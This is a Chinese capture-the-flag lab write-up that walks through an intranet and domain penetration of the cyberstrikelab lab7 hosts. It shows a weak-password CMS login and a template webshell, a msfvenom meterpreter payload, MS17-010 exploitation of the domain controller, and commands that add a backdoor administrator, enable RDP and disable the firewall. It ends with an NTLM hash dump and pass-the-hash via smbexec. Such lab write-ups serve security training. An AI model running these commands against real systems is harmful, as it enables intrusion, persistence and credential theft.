+++
series = ["内网渗透 学习记录"]
categories = ["Web安全", "内网渗透", "域渗透"]
tags = ["Web安全", "内网渗透", "域渗透"]
description = "靶机"
title = "cyberstrikelab-lab7"
date = 2026-08-24T09:17:32+08:00
draft = false
pin = false
+++



重生之我是白帽子，对某公司的192.168.10.0/24网段进行渗透测试。

# flag1

端口信息收集

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094045541.png)

访问  9652  发现八哥 cms

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094127006.png)

找到后台路径，弱口令登录

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094246128.png)

```c
[管理登录 - BageCMS](http://192.168.10.10:9652/index.php?r=admini/public/login)
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094305344.png)

admin    admin123456

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094405039.png)

模板中写马

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094748083.png)

连接

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094759439.png)


找到第一个flag

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094823252.png)


go-flag{d1KQD96N6PzPeBjt}

# flag2

信息收集

10主机最高权限  存在双网卡  10段 和 20 段 且在工作组里面

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713094934463.png)

上线    msf

```c
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_64.exe

use exploit/multi/handler  # 启用监听模块  
  
set payload windows/x64/meterpreter/bind_tcp  # 匹配生成木马时的payload``  
  
set RHOST 192.168.10.10  # 目标服务器IP地址  
  
run
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713111115234.png)

上传fscan  扫描  20段

```c
C:\phpstudy_pro\WWW>fscan.exe -h 192.168.20.0/24
fscan.exe -h 192.168.20.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 192.168.20.10   is alive
(icmp) Target 192.168.20.20   is alive
(icmp) Target 192.168.20.40   is alive
[*] Icmp alive hosts len is: 3
192.168.20.10:445 open
192.168.20.40:139 open
192.168.20.40:88 open
192.168.20.20:3306 open
192.168.20.10:3306 open
192.168.20.40:445 open
192.168.20.20:445 open
192.168.20.20:139 open
192.168.20.10:139 open
192.168.20.40:135 open
192.168.20.20:135 open
192.168.20.10:135 open
192.168.20.10:7680 open
[*] alive ports len is: 13
start vulscan
[*] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[*] NetInfo
[*]192.168.20.40
   [->]WIN-137FCI4D99A
   [->]192.168.20.40
[*] NetInfo
[*]192.168.20.20
   [->]cyberweb
   [->]192.168.20.20
[+] MS17-010 192.168.20.40      (Windows Server 2016 Standard 14393)
[*] NetBios 192.168.20.40   [+] DC:WIN-137FCI4D99A.cyberstrikelab.com      Windows Server 2016 Standard 14393
已完成 13/13
[*] 扫描结束,耗时: 15.3497283s
```

20.40为域控
20.40存在msf17010

添加路由

```c
run autoroute -s 192.168.20.0/24  
  
run autoroute -p
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713111607790.png)

这里  wsl 有毛病  一直连不上  换kali  打ms17-010

```c
msf exploit(multi/handler) > use 19
msf auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.40
rhost => 192.168.20.40
msf auxiliary(admin/smb/ms17_010_command) > set command 'type c:\flag.txt'
command => type c:\flag.txt
msf auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.20.40:445     - Target OS: Windows Server 2016 Standard 14393
[*] 192.168.20.40:445     - Built a write-what-where primitive...
[+] 192.168.20.40:445     - Overwrite complete... SYSTEM session obtained!
[+] 192.168.20.40:445     - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.20.40:445     - Getting the command output...
[*] 192.168.20.40:445     - Executing cleanup...
[+] 192.168.20.40:445     - Cleanup was successful
[+] 192.168.20.40:445     - Command completed successfully!
[*] 192.168.20.40:445     - Output for "type c:\flag.txt":

go-flag{ueoJt7eB6AQL8OpL}

[*] 192.168.20.40:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

go-flag{ueoJt7eB6AQL8OpL}

# flag3

添加用户，开启3389.关闭防火墙

```c
set COMMAND 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'


set COMMAND 'net user zcx 123@abc /add'


set COMMAND 'net localgroup Administrators zcx /add'


set COMMAND 'netsh advfirewall set allprofiles state off'

set COMMAND 'net localgroup "Remote Desktop Users" zcx /add'


```

执行命令

```c
msf auxiliary(admin/smb/ms17_010_command) > set COMMAND 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
COMMAND => REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
msf auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.20.40:445     - Target OS: Windows Server 2016 Standard 14393
[*] 192.168.20.40:445     - Built a write-what-where primitive...
[+] 192.168.20.40:445     - Overwrite complete... SYSTEM session obtained!
[+] 192.168.20.40:445     - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.20.40:445     - Getting the command output...
[*] 192.168.20.40:445     - Executing cleanup...
[+] 192.168.20.40:445     - Cleanup was successful
[+] 192.168.20.40:445     - Command completed successfully!
[*] 192.168.20.40:445     - Output for "REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f":

�����ɹ���ɡ�


[*] 192.168.20.40:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/smb/ms17_010_command) > set COMMAND 'net user zcx 123@abc /add'
COMMAND => net user zcx 123@abc /add
msf auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.20.40:445     - Target OS: Windows Server 2016 Standard 14393
[*] 192.168.20.40:445     - Built a write-what-where primitive...
[+] 192.168.20.40:445     - Overwrite complete... SYSTEM session obtained!
[+] 192.168.20.40:445     - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.20.40:445     - Getting the command output...
[*] 192.168.20.40:445     - Executing cleanup...
[+] 192.168.20.40:445     - Cleanup was successful
[+] 192.168.20.40:445     - Command completed successfully!
[*] 192.168.20.40:445     - Output for "net user zcx 123@abc /add":

����ɹ���ɡ�



[*] 192.168.20.40:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/smb/ms17_010_command) > set COMMAND 'net localgroup Administrators zcx /add'
COMMAND => net localgroup Administrators zcx /add
msf auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.20.40:445     - Target OS: Windows Server 2016 Standard 14393
[*] 192.168.20.40:445     - Built a write-what-where primitive...
[+] 192.168.20.40:445     - Overwrite complete... SYSTEM session obtained!
[+] 192.168.20.40:445     - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.20.40:445     - Getting the command output...
[*] 192.168.20.40:445     - Executing cleanup...
[+] 192.168.20.40:445     - Cleanup was successful
[+] 192.168.20.40:445     - Command completed successfully!
[*] 192.168.20.40:445     - Output for "net localgroup Administrators zcx /add":

����ɹ���ɡ�



[*] 192.168.20.40:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/smb/ms17_010_command) > set COMMAND 'netsh advfirewall set allprofiles state off'
COMMAND => netsh advfirewall set allprofiles state off
msf auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.20.40:445     - Target OS: Windows Server 2016 Standard 14393
[*] 192.168.20.40:445     - Built a write-what-where primitive...
[+] 192.168.20.40:445     - Overwrite complete... SYSTEM session obtained!
[+] 192.168.20.40:445     - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.20.40:445     - Getting the command output...
[*] 192.168.20.40:445     - Executing cleanup...
[+] 192.168.20.40:445     - Cleanup was successful
[+] 192.168.20.40:445     - Command completed successfully!
[*] 192.168.20.40:445     - Output for "netsh advfirewall set allprofiles state off":

ȷ����



[*] 192.168.20.40:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(admin/smb/ms17_010_command) > set COMMAND 'net localgroup "Remote Desktop Users" zcx /add'
COMMAND => net localgroup "Remote Desktop Users" zcx /add
msf auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.20.40:445     - Target OS: Windows Server 2016 Standard 14393
[*] 192.168.20.40:445     - Built a write-what-where primitive...
[+] 192.168.20.40:445     - Overwrite complete... SYSTEM session obtained!
[+] 192.168.20.40:445     - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.20.40:445     - Getting the command output...
[*] 192.168.20.40:445     - Executing cleanup...
[+] 192.168.20.40:445     - Cleanup was successful
[+] 192.168.20.40:445     - Command completed successfully!
[*] 192.168.20.40:445     - Output for "net localgroup "Remote Desktop Users" zcx /add":

����ɹ���ɡ�



[*] 192.168.20.40:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


开启socks 代理


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713122653181.png)

远程连接成功

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713122921475.png)

上线5555.exe   到 msf 上   注意用管理员身份进行点击

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713124602557.png)


然后提权


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713123514456.png)

脱hash

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713123538342.png)

```c
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d8174fc8c5ee7a8e460df2e61d00bd3c:::
```

进行  pth 192.168.20.20

```c
python smbexec.py -hashes :d8174fc8c5ee7a8e460df2e61d00bd3c cyberstrikelab.com/administrator@192.168.20.20
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260713124213444.png)

go-flag{TeVEsRMPOtsOmqnN}


